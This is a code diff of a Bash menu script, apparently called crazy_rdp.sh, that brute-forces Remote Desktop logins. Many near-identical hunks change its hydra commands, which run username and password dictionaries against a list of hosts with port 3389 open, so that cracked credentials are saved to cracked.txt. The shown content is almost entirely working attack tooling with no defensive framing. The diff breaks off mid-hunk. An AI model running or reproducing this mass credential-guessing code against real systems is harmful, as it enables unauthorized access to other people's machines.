@@ -3634,7 +3634,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3644,7 +3644,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3654,7 +3654,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3663,7 +3663,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3707,7 +3707,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3717,7 +3717,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3727,7 +3727,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3736,7 +3736,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3780,7 +3780,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3790,7 +3790,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3800,7 +3800,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3809,7 +3809,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3853,7 +3853,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3863,7 +3863,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3873,7 +3873,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3882,7 +3882,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3926,7 +3926,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3936,7 +3936,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3946,7 +3946,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3955,7 +3955,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -3999,7 +3999,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4009,7 +4009,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4019,7 +4019,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4028,7 +4028,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4072,7 +4072,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4082,7 +4082,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4092,7 +4092,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4101,7 +4101,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4145,7 +4145,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4155,7 +4155,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4165,7 +4165,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4174,7 +4174,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4218,7 +4218,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4228,7 +4228,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4238,7 +4238,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4247,7 +4247,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4291,7 +4291,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4301,7 +4301,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4311,7 +4311,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4320,7 +4320,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4364,7 +4364,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4374,7 +4374,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4384,7 +4384,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4393,7 +4393,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4437,7 +4437,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4447,7 +4447,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4457,7 +4457,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4466,7 +4466,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4510,7 +4510,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4520,7 +4520,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4530,7 +4530,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4539,7 +4539,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4583,7 +4583,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4593,7 +4593,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4603,7 +4603,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4612,7 +4612,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4656,7 +4656,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4666,7 +4666,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4676,7 +4676,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4685,7 +4685,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4729,7 +4729,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4739,7 +4739,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -4749,7 +4749,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
